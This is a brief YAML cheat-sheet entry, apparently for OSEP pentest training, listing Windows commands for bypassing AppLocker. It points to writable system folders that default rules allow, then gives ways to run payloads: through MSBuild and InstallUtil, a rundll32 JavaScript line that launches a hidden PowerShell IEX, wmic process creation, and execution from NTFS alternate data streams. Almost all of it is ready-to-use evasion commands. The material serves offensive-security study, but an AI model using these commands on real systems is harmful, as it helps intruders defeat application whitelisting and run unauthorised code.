---
description: |
  Bypass AppLocker restrictions to execute binaries and scripts.
  Essential for OSEP evasion scenarios.
command: |
  # Check AppLocker policy
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

  # Common writable paths (default AppLocker rules allow)
  C:\Windows\Tasks\
  C:\Windows\Temp\
  C:\Windows\tracing\
  C:\Windows\System32\spool\drivers\color\

  # MSBuild bypass (execute C# code)
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

  # InstallUtil bypass
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

  # Rundll32
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -c IEX(...)");

  # WMIC
  wmic process call create "cmd /c whoami"

  # Alternate Data Streams
  type payload.exe > "C:\Windows\Tasks\legit.txt:payload.exe"
  wmic process call create '"C:\Windows\Tasks\legit.txt:payload.exe"'
phase:
  - Post-Exploitation
target_os:
  - Windows
services: []
items:
  - Shell
techniques: []
network_position:
  - Local
references:
  - https://github.com/api0cradle/UltimateAppLockerByPassList
---
